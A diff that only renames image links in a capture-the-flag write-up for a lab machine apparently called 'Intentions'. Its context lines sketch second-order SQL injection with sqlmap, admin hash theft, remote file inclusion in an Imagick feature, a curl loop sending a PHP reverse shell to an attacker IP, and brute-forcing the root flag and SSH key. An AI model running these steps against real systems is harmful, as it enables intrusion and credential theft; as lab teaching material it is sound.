@@ -21,7 +21,7 @@ We don't need to add any domains for this machine. Since only port 80 is open, w
 
 Port 80 reveals a basic login page:
 
-![](<../../.gitbook/assets/image%20(1154).png>)
+![](../../.gitbook/assets/intentions-1.png)
 
 The HTTP requests sent when visiting this page are rather interesting:
 
@@ -40,19 +40,19 @@ Upgrade-Insecure-Requests: 1
 
 So there are some forms of `base64` encoded cookies involved in this website. Anyways, I registered a new user and logged in to view the gallery:
 
-![](<../../.gitbook/assets/image%20(1294).png>)
+![](../../.gitbook/assets/intentions-2.png)
 
 When we login, there is an extra cookie called `token` that is being assigned. It's a JWT token with this value:
 
-![](<../../.gitbook/assets/image%20(213).png>)
+![](../../.gitbook/assets/intentions-7.png)
 
 Again, not sure what to do with this yet. We can click on the 'Gallery' option to see the traffic generated:
 
-![](<../../.gitbook/assets/image%20(3538).png>)
+![](../../.gitbook/assets/intentions-15.png)
 
 From the looks of it, it seems that the backend uses some kind of SQL database based on the data returned. When we view our 'Profile', we can see that there is an option to update it with our favourite genres:
 
-![](<../../.gitbook/assets/image%20(2738).png>)
+![](../../.gitbook/assets/intentions-10.png)
 
 This sends this POST request to the backend:
 
@@ -127,7 +127,7 @@ The only point of weakness seems to be that 'Genre' updating feature, so I went 
 
 To resolve this, I used the `--tamper=space2plus` flag. While the `sqlmap` ran, I checked the other parts of the website. If we attempt to view the `/feed`, there is a weird error response captured:
 
-![](<../../.gitbook/assets/image%20(1950).png>)
+![](../../.gitbook/assets/intentions-5.png)
 
 This normally didn't happen because requests to this would return images with their IDs. This highlights that the injection results might only be viewable when we send a request here instead, thus making the website potentially vulnerable to 2nd order SQL Injection:
 
@@ -225,17 +225,17 @@ $ sqlmap -r req --tamper=space2comment --batch --second-req req2 -D intentions -
 
 `greg` and `steve` are both the administrators of the website, and we have their Bcrypt hashes. I used the same method to login for the v1 API, which involved sending a POST request to `/api/v1/auth/login`, and it responds as I expected:
 
-![](<../../.gitbook/assets/image%20(3560).png>)
+![](../../.gitbook/assets/intentions-18.png)
 
 Sending the correct parameters resulted in a successful login as `greg`, which generates a valid token.
 
-![](<../../.gitbook/assets/image%20(1431).png>)
+![](../../.gitbook/assets/intentions-3.png)
 
 ### Admin API -> RCE
 
 We can grab the `token` value we were returned on the successful login. Now, we need to find the directory about 'image editing'. We can repeat the above request in a browser, and then check the `/admin` directory, which now works properly:
 
-![](<../../.gitbook/assets/image%20(3191).png>)
+![](../../.gitbook/assets/intentions-14.png)
 
 The link brings us to the PHP page for Imagick:
 
@@ -243,11 +243,11 @@ The link brings us to the PHP page for Imagick:
 
 Going to "Images" reveals that we can edit them:
 
-![](<../../.gitbook/assets/image%20(3564).png>)
+![](../../.gitbook/assets/intentions-19.png)
 
 We can edit the images using 4 different effects:
 
-![](<../../.gitbook/assets/image%20(3555).png>)
+![](../../.gitbook/assets/intentions-16.png)
 
 This would send a POST request to the v2 API:
 
@@ -282,7 +282,7 @@ The above exploit uses an RFI to load some PHP objects for RCE. We can test this
 {"path":"http://10.10.14.64/hiiamrfi","effect":"wave"}
 ```
 
-![](<../../.gitbook/assets/image%20(2924).png>)
+![](../../.gitbook/assets/intentions-11.png)
 
 Since this was vulnerable to RFI, there's a high chance that it is vulnerable to the exploit above. We can follow the PoC to make it work. Firstly, we need to create a reverse shell payload within an image.
 
@@ -346,13 +346,13 @@ $ while true; do curl -G --data-urlencode 'a=$sock=fsockopen("10.10.14.64",4444)
 
 Then, we just need to start both the payloads within Burpsuite Intruder with NULL requests.
 
-![](<../../.gitbook/assets/image%20(2659).png>)
+![](../../.gitbook/assets/intentions-8.png)
 
 When we run it both the Intruder instances, we would get a few requests to our Python HTTP server, and a reverse shell as `www-data`!
 
-![](<../../.gitbook/assets/image%20(3180).png>)
+![](../../.gitbook/assets/intentions-12.png)
 
-![](<../../.gitbook/assets/image%20(760).png>)
+![](../../.gitbook/assets/intentions-22.png)
 
 ## Privilege Escalation
 
@@ -435,11 +435,11 @@ wget <IP>:4444/rep.tar
 
 Afterwards, we can view the `git log -p -2` output to find some credentials.
 
-![](<../../.gitbook/assets/image%20(212).png>)
+![](../../.gitbook/assets/intentions-6.png)
 
 We can then `su` to `greg`.
 
-![](<../../.gitbook/assets/image%20(428).png>)
+![](../../.gitbook/assets/intentions-20.png)
 
 ### Scanner Group -> Root Flag
 
@@ -519,7 +519,7 @@ greg@intentions:/opt/scanner$ ./scanner -p -s 2 -c /root/root.txt -l 1
 
 The resultant hash is crackable on CrackStation to give the first character of the flag:
 
-![](<../../.gitbook/assets/image%20(3558).png>)
+![](../../.gitbook/assets/intentions-17.png)
 
 We can slowly brute force the `root` flag out character by character. The user flag was 33 characters, so this should be the same. I took the script from my RainyDay writeup and modified it a bit:
 
@@ -615,7 +615,7 @@ for h in hashes:
             break
 ```
 
-![](<../../.gitbook/assets/image%20(659).png>)
+![](../../.gitbook/assets/intentions-21.png)
 
 This would eventually get the correct hash out for us to submit.
 
@@ -636,7 +636,7 @@ We can then transfer this to our machine via hosting the `output.txt` file on a 
 $ cat sshkey.txt | awk '{print "\"" $5 "\"\,"}' > hashes.py
 ```
 
-![](<../../.gitbook/assets/image%20(2732).png>)
+![](../../.gitbook/assets/intentions-9.png)
 
 Just put this within a list like `hashes = [ <all the hashes> ]`. Afterwards, `sshkey.py` can be used to brute force the SSH key:
 
@@ -660,10 +660,10 @@ for h in hashes:
             break
 ```
 
-![](<../../.gitbook/assets/image%20(3190).png>)
+![](../../.gitbook/assets/intentions-13.png)
 
 Then, just use this to `ssh` in as `root`:
 
-![](<../../.gitbook/assets/image%20(157).png>)
+![](../../.gitbook/assets/intentions-4.png)
 
 Rooted!
